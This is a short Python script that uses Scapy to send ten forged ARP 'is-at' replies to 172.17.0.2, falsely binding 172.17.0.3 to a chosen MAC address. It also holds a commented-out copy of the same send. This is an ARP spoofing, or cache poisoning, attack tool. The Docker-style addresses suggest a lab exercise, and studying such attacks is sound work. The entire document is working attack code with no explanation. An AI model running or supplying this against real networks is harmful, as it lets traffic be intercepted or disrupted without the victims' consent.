#! /usr/bin/env python

from scapy.all import *

for i in range(0, 10):
    send(ARP(pdst='172.17.0.2', 
             psrc='172.17.0.3', 
             hwdst='02:42:ac:11:00:02', 
             op='is-at'), 
        iface='lo', verbose=False)
    print("sent packet")



    ##send(ARP(pdst='172.17.0.2',psrc='172.17.0.3',hwdst='02:42:ac:11:00:02',op=2),iface='lo',verbose=False)
